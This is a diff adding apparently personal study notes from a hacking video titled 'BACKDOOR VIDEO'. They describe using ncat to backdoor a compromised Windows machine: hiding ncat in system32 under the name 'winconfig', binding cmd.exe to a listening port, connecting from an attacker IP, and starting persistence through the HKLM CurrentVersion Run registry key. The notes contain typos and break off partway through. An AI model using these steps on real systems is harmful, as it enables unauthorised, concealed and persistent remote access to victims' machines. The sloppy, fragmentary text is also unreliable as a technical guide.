@@ -1,0 +1,44 @@
+BACKDOOR VIDEO
+
+ncat 
+
+	- create a stable connection 
+	- network utility tcp /udp 
+	- read and write on network connections 
+
+- l = listening mode
+- e = execute file
+- p = port
+- v = verbose 
+
+ncat in action
+
+	- comprise victim machine and upload a windows version of ncat on it OR WONT WORK
+
+	- hide ncat -> move to system32 folder and named winconfig
+
+	- on target machine 
+
+		winconfig
+
+		winconfig -l -p 5555f -e cmd.exe (return a terminal with last command)
+
+	- attacker
+
+		- open a shell 
+
+		ncat 192.168.162.152 5555
+
+	- if attacker is inside the network 
+
+		- reverse connection 
+
+	- create persistence backdoor with ncat 
+
+		- attacker machine to set up listener
+
+		ncat -l -p 5544 -v 
+
+		- victim machine
+
+		regit display -> navigate to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run
